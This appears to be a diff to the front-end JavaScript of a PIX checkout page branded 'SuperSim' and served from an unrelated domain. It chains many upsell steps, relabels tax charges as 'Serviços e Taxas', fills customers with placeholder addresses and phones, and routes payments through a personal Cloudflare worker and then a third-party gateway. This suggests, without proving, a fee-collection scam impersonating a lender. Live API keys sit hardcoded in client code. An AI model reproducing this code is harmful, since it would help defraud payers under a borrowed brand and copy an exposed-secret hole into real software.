@@ -427,12 +427,12 @@
       'up2':  '../upsell/3/',
       'up3':  '../upsell/4/',
       'up4':  '../upsell/5/',
-      'up5':  '../upsell/6/',
-      'up6':  '../upsell/7/',
-      'up7':  '../upsell/8/',
-      'up8':  '../upsell/9/',
-      'up9':  '../upsell/10/',
-      'up10': '../upsell/11/',
+      'up5':  'https://supersim.com.br/',
+      'up6':  'https://supersim.com.br/',
+      'up7':  'https://supersim.com.br/',
+      'up8':  'https://supersim.com.br/',
+      'up9':  'https://supersim.com.br/',
+      'up10': 'https://supersim.com.br/',
       'up11': 'https://supersim.com.br/'
     };
     var UPSELL_URL = NEXT_MAP[OFFER] || '../upsell/1/';
@@ -460,7 +460,7 @@
         totalEl.textContent = PRICE_MAP[OFFER];
       }
     }
-    const FIREBOT_KEY = "fire_sk_live_f527b9f22237d5dedad3ef4a24c87919f904d4e4";
+    const TECHBYNET_KEY = "f3496353-b145-431a-91ac-1e47968b5b6f";
 
     // ---------- Helpers ----------
     function $(id){ return document.getElementById(id); }
@@ -595,37 +595,112 @@
         var desc = 'SuperSim - ' + titleOffer;
         if (!desc || desc.toLowerCase().includes("imposto")) desc = "Serviços e Taxas";
         var store = (typeof window !== "undefined" && window.location && window.location.origin) ? window.location.origin : "https://gilbertoconsultor.click";
+        var amountInCents = Math.round(valorReais * 100);
 
         var payload = {
-          amount: valorReais,
-          productType: "DIGITAL",
-          description: desc,
-          storeUrl: store,
+          amount: amountInCents,
           customer: {
             name: customer.name || 'Cliente',
             email: emailClean,
+            document: docClean,
             cpf: docClean,
-            phone: customer.phone || '11999999999',
-            address: "Av. Paulista, 1000, Bela Vista, São Paulo - SP, CEP 01310-100"
-          }
+            phone: customer.phone || '11999999999'
+          },
+          title: desc,
+          description: desc
         };
 
-        var res = await fetch('https://rapid-tree-f2fa.kennedyrochasilva416.workers.dev/api/v1/pix/create', {
-          method: 'POST',
-          headers: {
-            'x-api-key': FIREBOT_KEY,
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(payload)
-        });
+        var data = null;
 
-        var data = await res.json();
-        var qrCodeText = data && (data.pixCopiaECola || (data.data && (data.data.pixCopiaECola || (data.data.pix && data.data.pix.qrcode) || data.data.qrCode)));
-        var txId = data && (data.transactionId || (data.data && (data.data.transactionId || data.data.id)));
+        // 1) Chamada primária via Netlify Function (sem bloqueio de CORS, seguro)
+        try {
+          var res = await fetch('/.netlify/functions/create-pix', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+          if (res.ok) {
+            data = await res.json();
+          }
+        } catch(eNetlify) {
+          console.warn('Netlify function indisponível, tentando fallback direto...', eNetlify);
+        }
+
+        // 2) Fallback direto para a API da Bynet (https://docs.techbynet.com/)
+        if (!data || !data.success) {
+          var directPayload = {
+            amount: amountInCents,
+            paymentMethod: "PIX",
+            customer: {
+              name: customer.name || 'Cliente',
+              email: emailClean,
+              document: { number: docClean, type: "CPF" },
+              phone: customer.phone || '11999999999',
+              externalRef: 'cli-' + Date.now(),
+              address: {
+                street: "Avenida Paulista",
+                streetNumber: "1000",
+                complement: "Sala 1",
+                zipCode: "01310-100",
+                neighborhood: "Bela Vista",
+                city: "Sao Paulo",
+                state: "SP",
+                country: "BR"
+              }
+            },
+            shipping: {
+              fee: 0,
+              address: {
+                street: "Avenida Paulista",
+                streetNumber: "1000",
+                complement: "Sala 1",
+                zipCode: "01310-100",
+                neighborhood: "Bela Vista",
+                city: "Sao Paulo",
+                state: "SP",
+                country: "BR"
+              }
+            },
+            items: [{
+              title: desc,
+              unitPrice: amountInCents,
+              quantity: 1,
+              tangible: false,
+              externalRef: 'item-' + Date.now()
+            }],
+            pix: { expiresInDays: 1 }
+          };
+
+          var directRes = await fetch('https://api-gateway.techbynet.com/api/user/transactions', {
+            method: 'POST',
+            headers: {
+              'x-api-key': TECHBYNET_KEY,
+              'User-Agent': 'AtivoB2B/1.0',
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(directPayload)
+          });
+          var directData = await directRes.json();
+          if (directData && directData.data) {
+            data = {
+              success: true,
+              transactionId: directData.data.id,
+              qrCode: directData.data.qrCode || (directData.data.pix && directData.data.pix.qrcode),
+              pixCopiaECola: directData.data.qrCode || (directData.data.pix && directData.data.pix.qrcode),
+              status: directData.data.status,
+              data: directData.data
+            };
+          } else {
+            throw new Error((directData && (directData.message || directData.error)) || 'Erro ao gerar PIX');
+          }
+        }
+
+        var qrCodeText = data && (data.pixCopiaECola || data.qrCode || (data.data && (data.data.qrCode || (data.data.pix && data.data.pix.qrcode))));
+        var txId = data && (data.transactionId || data.id || (data.data && data.data.id));
         var qrCodeBase64 = (data && data.qrCodeUrl) || (data && data.data && data.data.pix && data.data.pix.qrcode_base64) || '';
 
         if (!qrCodeText || !txId) {
-          console.error('Firebot Error:', data);
+          console.error('Bynet Error:', data);
           throw new Error((data && (data.message || data.error)) || 'Erro ao gerar PIX');
         }
 
@@ -725,16 +800,34 @@
       if (pollInFlight || paymentHandled || !transactionId) return;
       pollInFlight=true;
       try{
-        var res = await fetch('https://rapid-tree-f2fa.kennedyrochasilva416.workers.dev/api/v1/pix/' + transactionId, {
-          method: 'GET',
-          headers: { 'x-api-key': FIREBOT_KEY, 'accept': 'application/json' }
-        });
-        var r = await res.json();
-        if (r) {
-          var st = String(r.status || (r.data && r.data.status) || '').toUpperCase();
-          if (st === 'PAID' || st === 'APPROVED' || st === 'COMPLETED') {
-            paymentConfirmed();
+        var st = '';
+        // 1) Consulta via Netlify Function
+        try {
+          var res = await fetch('/.netlify/functions/check-pix?id=' + encodeURIComponent(transactionId));
+          if (res.ok) {
+            var r = await res.json();
+            st = String(r.status || (r.data && r.data.status) || '').toUpperCase();
           }
+        } catch(eNet) {}
+
+        // 2) Fallback direto na Bynet caso a function não responda
+        if (!st) {
+          var resDirect = await fetch('https://api-gateway.techbynet.com/api/user/transactions/' + encodeURIComponent(transactionId) + '/summary', {
+            method: 'GET',
+            headers: {
+              'x-api-key': TECHBYNET_KEY,
+              'User-Agent': 'AtivoB2B/1.0',
+              'Accept': 'application/json'
+            }
+          });
+          if (resDirect.ok) {
+            var rDirect = await resDirect.json();
+            st = String((rDirect.data && rDirect.data.status) || rDirect.status || '').toUpperCase();
+          }
+        }
+
+        if (st === 'PAID' || st === 'APPROVED' || st === 'COMPLETED') {
+          paymentConfirmed();
         }
       }catch(e){}
       finally{ pollInFlight=false; }
